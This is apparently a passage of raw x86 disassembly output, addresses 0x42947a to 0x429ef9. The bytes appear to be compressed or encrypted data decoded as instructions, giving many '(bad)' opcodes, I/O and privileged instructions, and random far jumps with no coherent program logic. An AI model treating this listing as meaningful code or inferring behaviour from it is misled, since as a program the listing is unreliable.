  42947a:	std    
  42947b:	rcr    DWORD PTR [edx],cl
  42947d:	push   edx
  42947e:	pop    eax
  42947f:	or     ch,BYTE PTR [ebp+0x75]
  429482:	or     BYTE PTR [ebx],cl
  429484:	(bad)  
  429485:	xlat   BYTE PTR ds:[ebx]
  429486:	js     0x4294ae
  429488:	push   edx
  429489:	pop    ebp
  42948a:	(bad)  [ebp-0x15]
  42948d:	mov    fs,WORD PTR [esi-0x53]
  429490:	mov    ebx,DWORD PTR [esp+eax*2+0x78994f62]
  429497:	les    edx,FWORD PTR [edi+0x1b74f2aa]
  42949d:	outs   dx,BYTE PTR ds:[esi]
  42949e:	xor    edi,DWORD PTR [ecx+0x2c]
  4294a1:	adc    eax,0xd21a4e2c
  4294a6:	inc    esp
  4294a7:	sbb    dh,bl
  4294a9:	jb     0x429456
  4294ab:	fwait
  4294ac:	je     0x429463
  4294ae:	adc    bh,BYTE PTR [edx]
  4294b0:	push   edi
  4294b1:	fsubr  QWORD PTR [ebx+ebx*4]
  4294b4:	and    eax,0xd4c80edf
  4294b9:	jae    0x429487
  4294bb:	add    al,0x6f
  4294bd:	loopne 0x429473
  4294bf:	gs shl eax,1
	...
  429532:	add    BYTE PTR [eax],al
  429534:	push   ecx
  429535:	div    BYTE PTR ds:0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x4e86c4f3
  429542:	and    bh,BYTE PTR [esi]
  429544:	or     BYTE PTR [edi+0xf60001],dh
  42954a:	add    BYTE PTR [eax],al
  42954c:	cmp    ch,ch
  42954e:	mov    DWORD PTR [esi],edx
  429550:	cdq    
  429551:	inc    esp
  429552:	test   eax,0x1c600972
  429557:	sbb    ecx,DWORD PTR [edi+0x19]
  42955a:	cmp    esi,DWORD PTR [edx-0x21]
  42955d:	fs mov eax,fs
  429560:	ds stos BYTE PTR es:[edi],al
  429562:	lods   al,BYTE PTR ds:[esi]
  429563:	xchg   ecx,eax
  429564:	(bad)  
  429565:	add    al,0xfc
  429567:	xor    ch,al
  429569:	sbb    edi,esp
  42956b:	sub    BYTE PTR [edi+0x5227a70d],bl
  429571:	jle    0x42953f
  429573:	int3   
  429574:	xor    DWORD PTR ds:0x4d879671,ebx
  42957a:	push   es
  42957b:	rol    ebp,0xc4
  42957e:	int3   
  42957f:	sbb    BYTE PTR [ebp-0x28],ch
  429582:	sar    DWORD PTR [eax],cl
  429584:	popf   
  429585:	xchg   edx,eax
  429586:	xchg   DWORD PTR [eax],esi
  429588:	outs   dx,BYTE PTR ds:[esi]
  429589:	call   0x6a4c5a58
  42958e:	sbb    DWORD PTR [edi+0x84a1ca2],esi
  429594:	sub    dh,BYTE PTR [edx+0x16]
  429597:	test   DWORD PTR [edi],esi
  429599:	lea    ecx,[edi]
  42959b:	cwde   
  42959c:	int3   
  42959d:	stos   BYTE PTR es:[edi],al
  42959e:	sti    
  42959f:	pop    esp
  4295a0:	mov    eax,0xf79a26e1
  4295a5:	pop    ss
  4295a6:	ret    0xd8fc
  4295a9:	scas   al,BYTE PTR es:[edi]
  4295aa:	and    al,0x49
  4295ac:	in     eax,0x91
  4295ae:	pop    ecx
  4295af:	scas   eax,DWORD PTR es:[edi]
  4295b0:	inc    ecx
  4295b1:	in     al,dx
  4295b2:	push   ecx
  4295b3:	or     DWORD PTR [ebp+0x38],ebp
  4295b6:	test   ecx,edi
  4295b8:	jne    0x4295f3
  4295ba:	rol    DWORD PTR [edi-0x1051b69d],cl
  4295c0:	out    dx,al
  4295c1:	add    edi,DWORD PTR [edi-0x26]
  4295c4:	(bad)  
  4295c5:	(bad)  
  4295c6:	push   edi
  4295c7:	aaa    
  4295c8:	out    0x1f,eax
  4295ca:	jp     0x429575
  4295cc:	sub    edi,edx
  4295ce:	inc    ebp
  4295cf:	xor    eax,0x2655f531
  4295d4:	bound  ecx,QWORD PTR [edi+0x3f]
  4295d7:	ja     0x429628
  4295d9:	or     DWORD PTR [eax+ecx*8-0x2d],esp
  4295dd:	cli    
  4295de:	daa    
  4295df:	sbb    al,dl
  4295e1:	ja     0x429639
  4295e3:	adc    esp,edx
  4295e5:	xchg   ecx,eax
  4295e6:	cmp    ah,bh
  4295e8:	in     al,0x6e
  4295ea:	dec    eax
  4295eb:	data16 jg 0x42960d
  4295ee:	aas    
  4295ef:	test   al,0xc3
  4295f1:	jb     0x4295a2
  4295f3:	aaa    
  4295f4:	lods   al,BYTE PTR ds:[esi]
  4295f5:	icebp  
  4295f6:	sub    esi,edi
  4295f8:	fist   WORD PTR [ebx+0x1f261460]
  4295fe:	xchg   ebx,eax
  4295ff:	push   ebx
  429600:	es jae 0x429682
  429603:	cdq    
  429604:	ret    0x4c72
  429607:	clc    
  429608:	jns    0x42963e
  42960a:	or     eax,0xc5e2e750
  42960f:	pop    esp
  429610:	frstor [eax]
  429612:	dec    edi
  429614:	or     BYTE PTR [esi+0x57037677],bl
  42961a:	pop    ebx
  42961b:	xor    al,0x5b
  42961d:	adc    cl,dl
  42961f:	and    al,BYTE PTR [ebx+0x4b]
  429622:	mov    ch,0x95
  429624:	sub    eax,DWORD PTR [eax]
  429626:	push   sp
  429628:	outs   dx,BYTE PTR ds:[esi]
  429629:	add    eax,esp
  42962b:	ret    
  42962c:	pop    esi
  42962d:	dec    edi
  42962e:	les    esp,FWORD PTR [esi+0x6f]
  429631:	popf   
  429632:	out    0x9c,al
  429634:	leave  
  429635:	adc    eax,DWORD PTR [edi+eax*4]
  429638:	stos   DWORD PTR es:[edi],eax
  429639:	adc    DWORD PTR [ebp-0x75],edi
  42963c:	fcmovb st,st(6)
  42963e:	pop    esp
  42963f:	scas   al,BYTE PTR es:[edi]
  429640:	sahf   
  429641:	fild   WORD PTR [eax]
	...
  4296b3:	add    BYTE PTR [esi+0x5b],dl
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296c1:	adc    dl,BYTE PTR [edi-0x2d]
  4296c4:	(bad)  
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [edi+0x59120643],al
  4296d1:	jle    0x42973e
  4296d3:	sub    DWORD PTR [ecx],esp
  4296d5:	inc    edi
  4296d6:	pop    esp
  4296d7:	iret   
  4296d8:	push   ss
  4296d9:	cdq    
  4296da:	iret   
  4296db:	repz mov ecx,0xc34616da
  4296e1:	mov    ds:0xf14a52bc,al
  4296e6:	mov    esi,0xd85740c7
  4296eb:	sbb    cl,BYTE PTR [ebp+0x24ab0de8]
  4296f1:	pop    eax
  4296f2:	int    0xa6
  4296f4:	(bad)  
  4296f5:	pusha  
  4296f6:	(bad)  
  4296f7:	mov    edi,0xa030f793
  4296fc:	aad    0x35
  4296fe:	cwde   
  4296ff:	xchg   edi,eax
  429700:	mov    ?,WORD PTR ds:0xca32d507
  429706:	ins    BYTE PTR es:[edi],dx
  429707:	hlt    
  429708:	add    eax,0x9d785b03
  42970d:	inc    esp
  42970e:	pop    edi
  42970f:	pop    esi
  429710:	repz mov edx,0x9333df58
  429716:	mov    ch,BYTE PTR [esi-0x11]
  429719:	test   al,0x59
  42971b:	and    DWORD PTR [edi],esp
  42971d:	push   cs
  42971e:	xchg   edx,eax
  42971f:	and    edx,DWORD PTR [esi+edi*1]
  429722:	inc    ecx
  429723:	or     cl,BYTE PTR [esi]
  429725:	test   al,0x7d
  429727:	sbb    edx,esi
  429729:	sub    dh,BYTE PTR [eax+0x67]
  42972c:	xor    esp,edi
  42972e:	lds    eax,FWORD PTR [edi-0x2f]
  429731:	mov    cl,0x4f
  429733:	arpl   WORD PTR [esi-0x35e76fd8],dx
  429739:	test   eax,0xc3bbcf62
  42973e:	out    0x14,eax
  429740:	mov    ch,0x2f
  429742:	scas   al,BYTE PTR es:[edi]
  429743:	sub    cl,BYTE PTR [edx]
  429745:	push   cs
  429746:	adc    eax,0xd19113e3
  42974b:	scas   al,BYTE PTR es:[edi]
  42974c:	mov    cl,0x15
  42974e:	(bad)  
  42974f:	and    eax,0x5f869c6e
  429754:	fst    st(4)
  429756:	xor    al,0x55
  429758:	push   esi
  429759:	data16 icebp 
  42975b:	xchg   esp,eax
  42975c:	sahf   
  42975d:	or     DWORD PTR [eax+0x5fa29d27],esp
  429763:	xor    bl,cl
  429765:	pop    es
  429766:	stc    
  429767:	adc    eax,0x58d87b87
  42976c:	xlat   BYTE PTR ds:[ebx]
  42976d:	adc    BYTE PTR [ebp+0x17329377],cl
  429773:	in     eax,0x5f
  429775:	outs   dx,DWORD PTR ds:[esi]
  429776:	outs   dx,BYTE PTR ds:[esi]
  429777:	js     0x429775
  429779:	ss mov ah,0x1a
  42977c:	lods   eax,DWORD PTR ds:[esi]
  42977d:	cli    
  42977e:	fnstcw WORD PTR [ebx-0x4c91c3fa]
  429784:	sbb    al,0xe6
  429786:	mov    edx,0xf4aa0718
  42978b:	inc    ecx
  42978c:	jo     0x42972b
  42978e:	loop   0x4297c7
  429790:	scas   al,BYTE PTR es:[edi]
  429791:	cli    
  429792:	jno    0x42978a
  429794:	aad    0x4b
  429796:	inc    ecx
  429797:	jecxz  0x429801
  429799:	jmp    0x8a72:0x5887b9de
  4297a0:	test   ebp,ebx
  4297a2:	mov    edx,0xfbbe0660
  4297a7:	jg     0x429806
  4297a9:	pushf  
  4297aa:	mov    cl,0x9e
  4297ac:	fucom  st(0)
  4297ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297af:	dec    esi
  4297b0:	pushf  
  4297b1:	add    dh,BYTE PTR [edx+0x39]
  4297b4:	pop    eax
  4297b5:	xchg   esp,eax
  4297b6:	adc    DWORD PTR [ebp-0x405bd350],esi
  4297bc:	push   0xbfb2ddaf
  4297c1:	and    BYTE PTR [eax],al
	...
  429833:	add    BYTE PTR [esi],ah
  429835:	jp     0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    ecx,esi
  429841:	lea    ebp,[esi+0x1b8f4b6]
  429847:	add    dh,dh
  429849:	add    BYTE PTR [eax],al
  42984b:	add    BYTE PTR [ebx],dh
  42984d:	mov    dh,0x65
  42984f:	xor    bh,BYTE PTR [edi*1-0x60c1576d]
  429856:	or     ebx,esi
  429858:	cwde   
  429859:	hlt    
  42985a:	loop   0x42981d
  42985c:	sub    DWORD PTR [edi],ebx
  42985e:	(bad)  
  42985f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429860:	push   ebx
  429861:	imul   BYTE PTR [esi-0x4]
  429864:	aam    0x8
  429866:	or     ah,BYTE PTR [ecx]
  429868:	in     al,0x2b
  42986a:	push   es
  42986b:	mov    cl,0xc1
  42986d:	fxch   st(1)
  42986f:	cmp    DWORD PTR ds:0xe9d4bc44,ecx
  429875:	idiv   bl
  429877:	nop
  429878:	sbb    al,BYTE PTR [edx]
  42987a:	sbb    DWORD PTR [ecx-0x4c],ecx
  42987d:	push   ss
  42987e:	retf   
  42987f:	push   ecx
  429880:	pop    esi
  429881:	loope  0x429874
  429883:	xor    ax,0x2534
  429887:	fcom   QWORD PTR [esi]
  429889:	fisttp WORD PTR [esi]
  42988b:	jp     0x4298c6
  42988d:	retf   0xd695
  429890:	mov    ds:0xbefd9346,al
  429895:	xchg   ebp,eax
  429896:	jmp    0xaf8292d
  42989b:	mov    esp,esi
  42989d:	ja     0x429914
  42989f:	out    0x38,al
  4298a1:	(bad)  
  4298a3:	inc    ebp
  4298a4:	pushf  
  4298a5:	jnp    0x429872
  4298a7:	push   ebp
  4298a8:	pusha  
  4298a9:	out    dx,eax
  4298aa:	aaa    
  4298ab:	cmp    al,0x1a
  4298ad:	rcl    dh,0xd5
  4298b0:	iret   
  4298b1:	pop    edx
  4298b2:	frstor [edx+0x53f4a800]
  4298b8:	jle    0x4298f7
  4298ba:	push   ecx
  4298bb:	ins    DWORD PTR es:[edi],dx
  4298bc:	cmp    dh,BYTE PTR [ebx]
  4298be:	and    DWORD PTR [edx],0x36
  4298c1:	or     bl,bl
  4298c3:	inc    esp
  4298c4:	pop    eax
  4298c5:	ror    esi,1
  4298c7:	(bad)  
  4298c8:	sub    eax,0xdf878f9f
  4298cd:	cmc    
  4298ce:	dec    ebx
  4298cf:	stos   DWORD PTR es:[edi],eax
  4298d0:	cmp    DWORD PTR [ebx+0x11],ecx
  4298d3:	push   0x666a12a8
  4298d8:	push   esp
  4298d9:	ins    BYTE PTR es:[edi],dx
  4298da:	mov    edx,0x3fbf074e
  4298df:	mov    dl,0x87
  4298e1:	aam    0xf2
  4298e3:	and    eax,0x96291726
  4298e8:	xor    ch,cl
  4298ea:	add    DWORD PTR [ecx-0x4adba26d],edi
  4298f0:	jl     0x429923
  4298f2:	out    0xb1,eax
  4298f4:	push   0x71
  4298f6:	in     al,0xae
  4298f8:	loop   0x4298a6
  4298fa:	push   ds
  4298fb:	fild   WORD PTR [esi-0x2a]
  4298fe:	cmp    esp,edx
  429900:	arpl   WORD PTR [ecx+eiz*2],dx
  429903:	mov    ch,0x66
  429905:	arpl   WORD PTR [esp+eax*1-0x3ac31d86],si
  42990c:	scas   eax,DWORD PTR es:[edi]
  42990d:	jmp    0xd362:0x5f5b5060
  429914:	scas   al,BYTE PTR es:[edi]
  429915:	inc    ecx
  429916:	(bad)  
  429917:	out    0x2b,al
  429919:	in     eax,0x98
  42991b:	sbb    DWORD PTR [ecx],edi
  42991d:	out    0xc9,al
  42991f:	and    cl,BYTE PTR [edx]
  429921:	mov    al,ds:0xdf67e3fd
  429926:	mov    dh,0x75
  429928:	jle    0x42990d
  42992a:	mov    al,0xab
  42992c:	cmp    ah,bh
  42992e:	jne    0x42998e
  429930:	inc    esi
  429931:	xchg   edx,eax
  429932:	cmp    eax,DWORD PTR [edx-0x72]
  429935:	retf   
  429936:	imul   eax,DWORD PTR [ecx],0x66
  429939:	enter  0xef4,0x7
  42993d:	mov    ds:0xed9cdccb,al
	...
  4299b2:	add    BYTE PTR [eax],al
  4299b4:	dec    ebp
  4299b5:	or     al,0xf8
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    eax,esp
  4299c1:	arpl   WORD PTR [ebx+0x1b9ea1e],bp
  4299c7:	add    dh,dh
  4299c9:	add    BYTE PTR [eax],al
  4299cb:	add    BYTE PTR [ecx-0x52],bh
  4299ce:	mov    ebx,0xd43b3f75
  4299d3:	sti    
  4299d4:	mov    dh,0x64
  4299d6:	dec    BYTE PTR [edi+0x44]
  4299d9:	ret    0x8139
  4299dc:	aas    
  4299dd:	call   FWORD PTR [edx]
  4299df:	xchg   edi,eax
  4299e0:	pop    ebp
  4299e1:	pop    edi
  4299e2:	add    DWORD PTR [ebp+0x18],0xa07236f1
  4299e9:	mov    edx,0xb749d5dc
  4299ee:	out    dx,al
  4299ef:	dec    BYTE PTR [edx+0x5163a966]
  4299f5:	sti    
  4299f6:	cdq    
  4299f7:	in     al,0x44
  4299f9:	push   ebp
  4299fa:	fcom   QWORD PTR [ecx-0x3a95ae5f]
  429a00:	das    
  429a01:	cli    
  429a02:	xchg   al,cl
  429a04:	cwde   
  429a05:	ffreep st(7)
  429a07:	mov    cs,WORD PTR [ecx]
  429a09:	lods   eax,DWORD PTR ds:[esi]
  429a0a:	call   0x7c726b23
  429a0f:	mov    bl,0xd4
  429a11:	mov    DWORD PTR [edx+0x38],0x627d1074
  429a18:	push   esp
  429a19:	pop    ecx
  429a1a:	xchg   esi,eax
  429a1b:	xchg   esp,eax
  429a1c:	sub    dl,al
  429a1e:	and    DWORD PTR [ebx+eax*8+0x44],ebp
  429a22:	push   esp
  429a23:	mov    ecx,0x7200179d
  429a28:	out    0xe9,al
  429a2a:	push   ss
  429a2b:	dec    ecx
  429a2c:	lea    esp,[ebx-0x368f0079]
  429a32:	outs   dx,BYTE PTR ds:[esi]
  429a33:	mov    ebx,0x3996c435
  429a38:	push   ebp
  429a39:	pop    ebx
  429a3a:	mov    cs,WORD PTR [ecx+0x1822b5f8]
  429a40:	push   ebp
  429a41:	sub    DWORD PTR [esi],esi
  429a43:	sbb    BYTE PTR [ebp+0xa],dl
  429a46:	jnp    0x429a20
  429a48:	in     al,dx
  429a49:	xchg   ecx,eax
  429a4a:	fcomp  QWORD PTR [edx]
  429a4c:	mov    dh,0x20
  429a4e:	sub    dl,cl
  429a50:	pop    ds
  429a51:	pop    edi
  429a52:	fdiv   st(5),st
  429a54:	fwait
  429a55:	ret    
  429a56:	mov    cl,0x4b
  429a58:	or     al,0xe2
  429a5a:	adc    bh,bh
  429a5c:	popa   
  429a5d:	sub    al,0x74
  429a5f:	mov    ah,0x19
  429a61:	cmp    BYTE PTR [eax],cl
  429a63:	and    edx,DWORD PTR gs:[edi+0x42bd1206]
  429a6a:	pop    ebp
  429a6b:	test   BYTE PTR cs:[edx],cl
  429a6e:	in     al,dx
  429a6f:	(bad)  
  429a70:	pop    edi
  429a71:	jbe    0x429ad4
  429a73:	inc    ebp
  429a74:	xor    BYTE PTR [ecx-0x3b],bl
  429a77:	dec    edx
  429a78:	pop    ebx
  429a79:	jmp    0xd233:0x107ed7
  429a80:	adc    ecx,DWORD PTR [edi+0x21]
  429a83:	aad    0xf8
  429a85:	push   edx
  429a86:	ds inc esi
  429a88:	jmp    0x429a52
  429a8a:	sbb    al,0x6f
  429a8c:	xchg   edi,eax
  429a8d:	mov    ds:0x1468bddc,eax
  429a92:	scas   al,BYTE PTR es:[edi]
  429a93:	cmp    eax,0xbcf9a682
  429a98:	repz sbb dh,bl
  429a9b:	push   es
  429a9c:	shl    ebx,0x41
  429a9f:	in     eax,dx
  429aa0:	aam    0xe5
  429aa2:	outs   dx,DWORD PTR ds:[esi]
  429aa3:	(bad)  
  429aa5:	fld    QWORD PTR [ebp-0x3fcf0e7a]
  429aab:	ja     0x429af8
  429aad:	mov    ebp,0xfd3303
  429ab2:	pop    eax
  429ab3:	popa   
  429ab4:	js     0x429ae2
  429ab6:	cli    
  429ab7:	xor    esi,DWORD PTR [bx+di+0x94e]
  429abc:	icebp  
  429abd:	xchg   edi,eax
  429abe:	mov    dh,0x18
  429ac0:	jmp    0x429b35
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0xd1d5
  429b42:	jge    0x429b68
  429b44:	loopne 0x429b00
  429b46:	add    DWORD PTR [eax],eax
  429b48:	test   BYTE PTR [eax],0x0
  429b4b:	add    BYTE PTR [ebp+0x350aaeff],ch
  429b51:	or     esp,edx
  429b53:	mov    ebp,0x7fe77286
  429b58:	adc    bl,BYTE PTR [eax]
  429b5a:	addr16 xchg ebx,eax
  429b5c:	push   ds
  429b5d:	push   0xcf304cbf
  429b62:	push   0x3d1c2ef4
  429b67:	pusha  
  429b68:	ins    DWORD PTR es:[edi],dx
  429b69:	shl    DWORD PTR [eax+0x15],0x25
  429b6d:	ret    
  429b6e:	xchg   DWORD PTR [ebp+0x64],esi
  429b71:	imul   eax,DWORD PTR [esi+ebx*2+0x656af2f1],0xa7359303
  429b7c:	adc    eax,DWORD PTR [edx]
  429b7e:	dec    ebp
  429b7f:	xchg   ecx,eax
  429b80:	daa    
  429b81:	xor    DWORD PTR [esi],esp
  429b83:	popa   
  429b84:	xor    BYTE PTR [ecx],al
  429b86:	or     eax,0xf7d183a1
  429b8b:	mov    ah,0x59
  429b8d:	mov    bh,0x7f
  429b8f:	dec    ebp
  429b91:	test   eax,0x86534348
  429b96:	loop   0x429b9c
  429b98:	addr16 jle 0x429bf1
  429b9b:	or     edi,DWORD PTR [ecx]
  429b9d:	or     ebx,DWORD PTR [ebx]
  429b9f:	aas    
  429ba0:	and    ah,ah
  429ba2:	call   0xf8a267da
  429ba7:	xor    esi,ecx
  429ba9:	loop   0x429b42
  429bab:	sahf   
  429bac:	dec    edx
  429bad:	lds    eax,FWORD PTR [ebx-0x51]
  429bb0:	lods   al,BYTE PTR ds:[esi]
  429bb1:	sub    al,0xc1
  429bb3:	lahf   
  429bb4:	dec    ebp
  429bb5:	iret   
  429bb6:	or     esi,edx
  429bb8:	mov    eax,ds:0x10fa94f9
  429bbd:	mov    ebx,0x8a2f0d11
  429bc2:	mov    ch,0x14
  429bc4:	shl    ch,1
  429bc6:	adc    BYTE PTR [ebp+0x74e4f63a],dh
  429bcc:	add    BYTE PTR [edx+edx*1],bh
  429bcf:	mov    al,ds:0xad01e013
  429bd4:	clc    
  429bd5:	mov    edx,0x5aaba46
  429bda:	xor    edi,ecx
  429bdc:	(bad)  [ebx-0x6d3200c3]
  429be2:	iret   
  429be3:	(bad)  
  429be4:	push   ds
  429be5:	fimul  DWORD PTR [ecx]
  429be7:	cmc    
  429be8:	lods   al,BYTE PTR ds:[esi]
  429be9:	mov    eax,fs:0x51b5234d
  429bef:	popa   
  429bf0:	imul   ecx,DWORD PTR [edx-0x7f],0x3e
  429bf4:	daa    
  429bf5:	push   ds
  429bf6:	test   eax,0x687055ea
  429bfb:	xor    DWORD PTR [ebp-0x39],0x6b
  429bff:	sbb    eax,esp
  429c01:	mov    al,0x97
  429c03:	rcr    DWORD PTR [esi-0x11],1
  429c06:	inc    eax
  429c07:	cmp    DWORD PTR [eax+0x1ef8f135],edx
  429c0d:	stos   DWORD PTR es:[edi],eax
  429c0e:	mov    al,ds:0xc1a889fb
  429c13:	or     eax,DWORD PTR [bp+di]
  429c16:	inc    ebp
  429c17:	dec    ebx
  429c18:	mov    esp,0x43ad3f1b
  429c1d:	adc    bh,BYTE PTR [edx-0x1f]
  429c20:	xor    BYTE PTR ss:[edi-0x5b],ah
  429c24:	(bad)
  429c27:	popf   
  429c28:	les    edx,FWORD PTR [ecx]
  429c2a:	mov    BYTE PTR [ecx],ch
  429c2c:	mov    edi,0x43cb4fad
  429c31:	rcr    BYTE PTR [ebp+0x54],0xc1
  429c35:	mov    eax,ds:0xba0bc683
  429c3a:	xchg   ebp,eax
  429c3b:	push   esi
  429c3c:	cmp    esi,ebp
  429c3e:	aam    0xb8
  429c40:	push   ds
  429c41:	sub    DWORD PTR [eax],eax
	...
  429cb3:	add    BYTE PTR [ecx-0xace0e4b],al
  429cb9:	jne    0x429c7c
  429cbb:	mov    ch,0xdf
  429cbd:	xlat   BYTE PTR ds:[ebx]
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	(bad)  
  429cc1:	hlt    
  429cc2:	dec    edx
  429cc3:	mov    al,0xd6
  429cc5:	mov    ebx,0xf60001
  429cca:	add    BYTE PTR [eax],al
  429ccc:	lds    ebx,FWORD PTR [ebx]
  429cce:	sbb    ebp,ecx
  429cd0:	push   eax
  429cd1:	xchg   edx,eax
  429cd2:	aas    
  429cd3:	popa   
  429cd4:	mov    ebx,0x10638b0f
  429cd9:	aaa    
  429cda:	data16 (bad) 
  429cdc:	and    ch,BYTE PTR [edi-0x1812031]
  429ce2:	push   esp
  429ce3:	inc    ecx
  429ce4:	call   0xf96a:0x4a1fcca2
  429ceb:	mov    al,ds:0x54f27fec
  429cf0:	loopne 0x429c78
  429cf2:	loope  0x429c95
  429cf4:	mov    WORD PTR [ecx-0x12b718c8],ds
  429cfa:	popf   
  429cfb:	daa    
  429cfc:	jecxz  0x429d2d
  429cfe:	push   edx
  429cff:	popf   
  429d00:	icebp  
  429d01:	pusha  
  429d02:	xchg   ecx,eax
  429d03:	loopne 0x429cc5
  429d05:	popa   
  429d06:	enter  0xd12f,0xc0
  429d0a:	jp     0x429cd9
  429d0c:	sbb    bh,BYTE PTR [esi+0x25bb280e]
  429d12:	mov    edx,0x82333680
  429d17:	mov    bl,0xea
  429d19:	sbb    BYTE PTR [edi-0x44],0x43
  429d1d:	mov    cl,0x7d
  429d1f:	add    BYTE PTR gs:[ecx-0x6f],bh
  429d23:	popf   
  429d24:	jne    0x429d11
  429d26:	popf   
  429d27:	retf   
  429d28:	repnz add BYTE PTR [ebx-0x2d],al
  429d2c:	lods   eax,DWORD PTR ds:[esi]
  429d2d:	outs   dx,DWORD PTR ds:[esi]
  429d2e:	outs   dx,DWORD PTR ds:[esi]
  429d2f:	or     BYTE PTR ds:0xc2113202,dh
  429d35:	xchg   BYTE PTR [edx+esi*8-0x45d0608d],al
  429d3c:	jno    0x429ce4
  429d3e:	leave  
  429d3f:	adc    ebp,DWORD PTR [edi]
  429d41:	scas   al,BYTE PTR es:[edi]
  429d42:	mov    ch,0x2a
  429d44:	daa    
  429d45:	push   es
  429d46:	cmp    esp,edx
  429d48:	leave  
  429d49:	push   0x714bee75
  429d4e:	xchg   ebx,eax
  429d4f:	add    edi,edx
  429d51:	int3   
  429d52:	ins    BYTE PTR es:[edi],dx
  429d53:	push   ebx
  429d54:	clc    
  429d55:	xlat   BYTE PTR ds:[ebx]
  429d56:	test   eax,0xd30dd700
  429d5b:	outs   dx,DWORD PTR ds:[esi]
  429d5c:	mov    eax,0x64a24890
  429d61:	cmc    
  429d62:	std    
  429d63:	rcr    BYTE PTR [ebx+0x4],cl
  429d66:	inc    ebp
  429d67:	repnz adc DWORD PTR [eax],eax
  429d6a:	ds dec edi
  429d6c:	cwde   
  429d6d:	fcmovnbe st,st(7)
  429d6f:	cdq    
  429d70:	add    cl,BYTE PTR [ebp+0x79]
  429d73:	shr    BYTE PTR [edx+ebx*8+0x6ea57d2e],cl
  429d7a:	inc    ebx
  429d7b:	imul   esp,ebp,0xffffff87
  429d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d7f:	sahf   
  429d80:	in     al,dx
  429d81:	(bad)  [ebx]
  429d83:	mov    dl,0xd6
  429d85:	test   DWORD PTR [eax+0x286a5888],ebp
  429d8b:	or     eax,0x37de4122
  429d90:	cmp    ch,bh
  429d92:	(bad)  
  429d93:	hlt    
  429d94:	and    BYTE PTR [ebx-0x2962f520],cl
  429d9a:	sub    al,BYTE PTR [edi-0x7dc96f78]
  429da0:	(bad)
  429da4:	jnp    0x429e0f
  429da6:	les    ebx,FWORD PTR [edx-0x41]
  429da9:	rcl    bl,cl
  429dab:	fild   QWORD PTR ds:0x4711e621
  429db1:	ss mov ebp,0x6c88f40b
  429db7:	jl     0x429d76
  429db9:	call   0x3e9cb578
  429dbe:	loopne 0x429e1f
  429dc0:	sub    BYTE PTR [ebx+0x0],dl
	...
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax-0x5eb1d120]
  429e41:	in     al,0x21
  429e43:	repnz int3 
  429e45:	mov    esp,0xf60001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	call   DWORD PTR [ebp-0x2f99a085]
  429e52:	and    BYTE PTR [edx-0x40d01abb],dh
  429e58:	shr    BYTE PTR [eax],1
  429e5a:	sbb    al,0xe4
  429e5c:	popf   
  429e5d:	mov    BYTE PTR [ecx+0x327310ed],0xb8
  429e64:	push   ebx
  429e65:	mov    DWORD PTR [ebx],esp
  429e67:	jnp    0x429e19
  429e69:	adc    bh,BYTE PTR [ecx-0x727fbe77]
  429e6f:	sbb    BYTE PTR [edx+0x6de52605],cl
  429e75:	in     al,dx
  429e76:	adc    ch,BYTE PTR [edi+edi*1-0x2f621ce4]
  429e7d:	test   DWORD PTR [esi+eax*1+0x4c],eax
  429e81:	outs   dx,BYTE PTR ds:[esi]
  429e82:	mov    bh,0x8b
  429e84:	fcomip st,st(2)
  429e86:	cmp    ebx,edx
  429e88:	pop    eax
  429e89:	mov    al,ds:0x40111eb
  429e8e:	cmc    
  429e8f:	sbb    BYTE PTR [edi*8+0x27bd6468],dh
  429e96:	nop
  429e97:	xchg   ecx,eax
  429e98:	and    DWORD PTR [esi],edi
  429e9a:	call   0xc70:0x847b728a
  429ea1:	int3   
  429ea2:	dec    ecx
  429ea3:	aam    0x5a
  429ea5:	adc    edx,DWORD PTR ds:0xbc8cef31
  429eab:	(bad)  
  429eac:	and    ah,BYTE PTR [ecx+0x7f]
  429eaf:	lods   al,BYTE PTR ds:[esi]
  429eb0:	sub    edi,DWORD PTR [ebx+ebp*4]
  429eb3:	aaa    
  429eb4:	sahf   
  429eb5:	inc    edx
  429eb6:	out    0x65,al
  429eb8:	xchg   edx,eax
  429eb9:	lahf   
  429eba:	and    BYTE PTR gs:[esi-0x5bfab7bb],dh
  429ec1:	cmp    BYTE PTR [esi-0x78],ch
  429ec4:	inc    esp
  429ec5:	hlt    
  429ec6:	mov    ch,0xa9
  429ec8:	adc    al,0x1c
  429eca:	or     DWORD PTR [edx+0x2],0xffffffc9
  429ece:	mov    eax,ds:0xadd5259
  429ed3:	(bad)  
  429ed5:	fild   DWORD PTR [edx+edi*8+0x77]
  429ed9:	add    esp,DWORD PTR [ecx+0x3de18232]
  429edf:	sti    
  429ee0:	jg     0x429e7f
  429ee2:	cmp    DWORD PTR [edi],esp
  429ee4:	dec    ebp
  429ee5:	lods   al,BYTE PTR ds:[esi]
  429ee6:	or     BYTE PTR [esi],dl
  429ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ee9:	jmp    0x76762985
  429eee:	push   edi
  429eef:	sub    eax,0x9474942d
  429ef4:	fdivp  st(4),st
  429ef6:	fist   WORD PTR [edi-0x1c]
  429ef9:	add    ebx,DWORD PTR [edx-0x6e]
